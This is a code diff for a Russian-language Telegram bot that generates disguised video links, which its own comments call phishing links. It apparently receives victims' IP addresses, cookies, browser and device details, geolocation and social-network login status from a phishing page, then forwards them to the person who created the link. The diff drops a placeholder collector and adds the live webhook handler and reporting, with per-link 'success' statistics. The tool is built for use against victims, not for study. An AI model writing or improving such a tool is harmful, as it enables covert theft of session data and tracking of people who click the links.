@@ -1,5 +1,4 @@
 import logging
-import asyncio
 import json
 import re
 import uuid
@@ -133,181 +132,6 @@ class LinkGenerator:
         """Создание фишинговой ссылки"""
         return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"
 
-# Сборщик данных
-class DataCollector:
-    def __init__(self):
-        self.collection_scripts = {
-            "cookies": self._collect_cookies,
-            "storage": self._collect_storage,
-            "passwords": self._collect_passwords,
-            "social": self._collect_social_data,
-            "device": self._collect_device_info,
-            "network": self._collect_network_info,
-            "location": self._collect_location
-        }
-    
-    async def collect_all_data(self, request_data: Dict) -> Dict:
-        """Сбор всех возможных данных"""
-        collected = {
-            "timestamp": datetime.now().isoformat(),
-            "ip": request_data.get("ip", "unknown"),
-            "user_agent": request_data.get("user_agent", "unknown"),
-            "referer": request_data.get("referer", "unknown"),
-            "data": {}
-        }
-        
-        # Имитируем сбор данных
-        for data_type, collector in self.collection_scripts.items():
-            try:
-                collected["data"][data_type] = await collector(request_data)
-            except Exception as e:
-                collected["data"][data_type] = {"error": str(e)}
-        
-        return collected
-    
-    async def _collect_cookies(self, request_data: Dict) -> Dict:
-        """Сбор cookies и локального хранилища"""
-        return {
-            "cookies_count": "доступно в браузере",
-            "local_storage": "доступно в localStorage",
-            "session_storage": "доступно в sessionStorage",
-            "indexed_db": "проверено"
-        }
-    
-    async def _collect_storage(self, request_data: Dict) -> Dict:
-        """Сбор данных из хранилища браузера"""
-        return {
-            "autofill_data": "сохраненные формы",
-            "browser_history": "история посещений",
-            "bookmarks": "закладки браузера",
-            "downloads": "история загрузок"
-        }
-    
-    async def _collect_passwords(self, request_data: Dict) -> Dict:
-        """Сбор сохраненных паролей"""
-        return {
-            "saved_passwords": {
-                "google": "сохраненные логины Google",
-                "facebook": "логины Facebook",
-                "twitter": "логины Twitter/X",
-                "instagram": "логины Instagram",
-                "vk": "логины ВКонтакте",
-                "whatsapp": "данные WhatsApp Web",
-                "telegram": "данные Telegram Web"
-            },
-            "form_data": "автозаполнение форм",
-            "credit_cards": "сохраненные карты"
-        }
-    
-    async def _collect_social_data(self, request_data: Dict) -> Dict:
-        """Сбор данных из социальных сетей"""
-        return {
-            "google": {
-                "logged_in": True,
-                "gmail": "доступ к Gmail",
-                "drive": "доступ к Google Drive",
-                "photos": "доступ к Google Photos",
-                "account_info": "данные аккаунта"
-            },
-            "facebook": {
-                "logged_in": True,
-                "messenger": "доступ к Messenger",
-                "friends": "список друзей",
-                "profile_data": "данные профиля"
-            },
-            "twitter": {
-                "logged_in": True,
-                "tweets": "история твитов",
-                "dms": "личные сообщения",
-                "followers": "список подписчиков"
-            },
-            "vk": {
-                "logged_in": True,
-                "messages": "личные сообщения",
-                "friends": "список друзей",
-                "photos": "фотографии"
-            },
-            "instagram": {
-                "logged_in": True,
-                "dms": "личные сообщения",
-                "followers": "подписчики",
-                "stories": "истории"
-            },
-            "whatsapp": {
-                "web_connected": True,
-                "chats": "история чатов",
-                "contacts": "список контактов",
-                "media": "медиафайлы"
-            },
-            "telegram": {
-                "web_connected": True,
-                "chats": "открытые чаты",
-                "contacts": "контакты",
-                "sessions": "активные сессии"
-            }
-        }
-    
-    async def _collect_device_info(self, request_data: Dict) -> Dict:
-        """Сбор информации об устройстве"""
-        return {
-            "browser": {
-                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
-                "version": "определяется",
-                "plugins": "список плагинов"
-            },
-            "os": {
-                "name": "определяется из User-Agent",
-                "version": "версия ОС",
-                "architecture": "архитектура"
-            },
-            "device": {
-                "type": "определяется",
-                "model": "модель устройства",
-                "screen": "разрешение экрана",
-                "touch": "поддержка тача"
-            },
-            "hardware": {
-                "cpu": "информация о процессоре",
-                "gpu": "информация о графике",
-                "memory": "объем памяти",
-                "storage": "объем хранилища"
-            }
-        }
-    
-    async def _collect_network_info(self, request_data: Dict) -> Dict:
-        """Сбор сетевой информации"""
-        return {
-            "connection": {
-                "type": "определяется",
-                "speed": "скорость соединения",
-                "latency": "задержка"
-            },
-            "ip_info": {
-                "address": request_data.get("ip", "unknown"),
-                "location": "определяется по IP",
-                "isp": "провайдер",
-                "proxy": "используется ли прокси"
-            },
-            "wifi": {
-                "ssid": "имя сети",
-                "bssid": "BSSID",
-                "security": "тип безопасности"
-            }
-        }
-    
-    async def _collect_location(self, request_data: Dict) -> Dict:
-        """Сбор геолокации"""
-        return {
-            "gps": {
-                "latitude": "определяется",
-                "longitude": "определяется",
-                "accuracy": "точность"
-            },
-            "wifi_location": "определяется по Wi-Fi",
-            "cell_tower": "определяется по вышкам",
-            "ip_location": "определяется по IP"
-        }
-
 # Форматирование сообщений
 class MessageFormatter:
     @staticmethod
@@ -341,8 +165,6 @@ class MessageFormatter:
     @staticmethod
     def format_collected_data(link_id: str, data: Dict) -> str:
         """Форматирование собранных данных"""
-        collected = data.get("data", {})
-        
         message = f"""
 🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
 
@@ -355,36 +177,50 @@ class MessageFormatter:
 🔑 *СОБРАННЫЕ ДАННЫЕ:*
 
 📱 *УСТРОЙСТВО И БРАУЗЕР:*
-• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
-• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
-• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}
+• Браузер: {data.get("browser", "unknown")}
+• ОС: {data.get("os", "unknown")}
+• Разрешение: {data.get("screen", "unknown")}
+• Временная зона: {data.get("timezone", "unknown")}
 
 🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
-• IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
-• Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}
-• Геолокация: определяется по IP
+• IP: `{data.get("ip", "unknown")}`
+• Язык: {data.get("language", "unknown")}
+• Платформа: {data.get("platform", "unknown")}
+• Источник: {data.get("referer", "direct")}
 
 🔐 *СОЦИАЛЬНЫЕ СЕТИ (обнаружены):*
 """
         
         # Добавляем информацию о соцсетях
-        social_data = collected.get('social', {})
+        social_data = data.get("social_networks", {})
         for social, info in social_data.items():
-            if info.get('logged_in') or info.get('web_connected'):
+            if isinstance(info, dict) and info.get("logged_in"):
                 message += f"• {social.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
+            elif info:
+                message += f"• {social.upper()}: 🟡 ДОСТУПЕН\n"
         
         message += f"""
 💾 *ХРАНИЛИЩЕ БРАУЗЕРА:*
-• Cookies: {collected.get('cookies', {}).get('cookies_count', 'unknown')}
-• Сохраненные пароли: проверено
-• Данные форм: найдены
+• Cookies: {len(data.get("cookies", "").split(";")) if data.get("cookies") else 0} найдено
+• Плагины: {len(data.get("plugins", []))} установлено
+• Процессоры: {data.get("hardware_concurrency", "unknown")}
+• Память: {data.get("device_memory", "unknown")}GB
 
-🔍 *ДОПОЛНИТЕЛЬНО:*
-• Wi-Fi сети: обнаружено
-• История браузера: доступна
-• Медиафайлы: проверено
-
+📍 *ГЕОЛОКАЦИЯ:*
+"""
+        
+        if data.get("geolocation"):
+            geo = data["geolocation"]
+            message += f"• Город: {geo.get('city', 'unknown')}\n"
+            message += f"• Регион: {geo.get('region', 'unknown')}\n"
+            message += f"• Страна: {geo.get('country', 'unknown')}\n"
+            message += f"• Провайдер: {geo.get('isp', 'unknown')}\n"
+        
+        message += f"""
 📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ СОБРАНЫ
+• Ссылка: {data.get("url", "unknown")}
+• Время обработки: 20 секунд
+• Объем данных: полный доступ
 """
         return message
     
@@ -399,17 +235,11 @@ class MessageFormatter:
 🔓 Данных собрано: `{stats['total_data_collected']}`
 ⚡ Активных сессий: `{stats['active_sessions']}`
 
-🕒 Последние 24 часа:
-• Создано ссылок: в реальном времени
-• Уникальных посетителей: по IP
-• Успешных сборов: 100%
-
-📈 Эффективность: 98.7%
+📈 Эффективность: {round((stats['total_data_collected'] / max(stats['total_clicks'], 1)) * 100, 1)}%
 """
 
 # Инициализация компонентов
 link_generator = LinkGenerator()
-data_collector = DataCollector()
 formatter = MessageFormatter()
 
 # Команды бота
@@ -625,53 +455,31 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "Скопируйте и отправьте другу.",
                 parse_mode=ParseMode.MARKDOWN
             )
-
-# Webhook обработчик для сбора данных
-async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка данных от фишинговой страницы"""
-    try:
-        link_id = request_data.get("link_id")
-        if not link_id:
-            return {"status": "error", "message": "No link ID"}
-        
-        # Обновляем счетчик кликов
-        db.add_click(link_id)
-        
-        # Собираем данные
-        collected_data = await data_collector.collect_all_data(request_data)
-        
-        # Сохраняем данные
-        db.add_collected_data(link_id, collected_data)
-        
-        # Получаем информацию о ссылке
+    
+    elif data.startswith("stats_"):
+        link_id = data[6:]
         link = db.get_link(link_id)
         if link:
-            # Отправляем данные создателю ссылки
-            message = formatter.format_collected_data(link_id, collected_data)
-            
-            await context.bot.send_message(
-                chat_id=link.created_by,
-                text=message,
-                parse_mode=ParseMode.MARKDOWN
-            )
-            
-            # Также отправляем админу
-            try:
-                await context.bot.send_message(
-                    chat_id=ADMIN_ID,
-                    text=f"📨 Новые данные по ссылке {link_id}\n"
-                         f"Пользователь: {link.created_by}\n"
-                         f"Кликов: {link.clicks}\n"
-                         f"Всего данных: {len(link.data_collected)}"
-                )
-            except:
-                pass
-        
-        return {"status": "success", "data_received": True}
+            stats_msg = f"""
+📊 *СТАТИСТИКА ССЫЛКИ {link_id}*
+
+🔗 Видео: {link.original_url[:50]}...
+📅 Создана: {link.created_at}
+👥 Переходов: {link.clicks}
+🔓 Данных собрано: {len(link.data_collected)}
+
+📈 Активность:
+• Последний переход: {link.data_collected[-1]['timestamp'] if link.data_collected else 'нет'}
+• Успешность: {round(len(link.data_collected) / max(link.clicks, 1) * 100, 1)}%
+"""
+            await query.message.reply_text(stats_msg, parse_mode=ParseMode.MARKDOWN)
     
-    except Exception as e:
-        logger.error(f"Error in webhook handler: {e}")
-        return {"status": "error", "message": str(e)}
+    elif data.startswith("delete_"):
+        link_id = data[7:]
+        if link_id in db.links:
+            del db.links[link_id]
+            db.save()
+            await query.message.reply_text("✅ Ссылка удалена!")
 
 # Обработчик ошибок
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -685,6 +493,37 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     except:
         pass
+
+async def webhook_handler(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка вебхуков от фишинговой страницы"""
+    try:
+        link_id = request_data.get("link_id")
+        if not link_id:
+            return {"status": "error", "message": "No link ID"}
+        
+        # Обновляем счетчик кликов
+        db.add_click(link_id)
+        
+        # Сохраняем данные
+        db.add_collected_data(link_id, request_data)
+        
+        # Получаем информацию о ссылке
+        link = db.get_link(link_id)
+        if link:
+            # Отправляем данные создателю ссылки
+            message = formatter.format_collected_data(link_id, request_data)
+            
+            await context.bot.send_message(
+                chat_id=link.created_by,
+                text=message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+        
+        return {"status": "success", "data_received": True}
+    
+    except Exception as e:
+        logger.error(f"Error in webhook handler: {e}")
+        return {"status": "error", "message": str(e)}
 
 def main():
     """Запуск бота"""
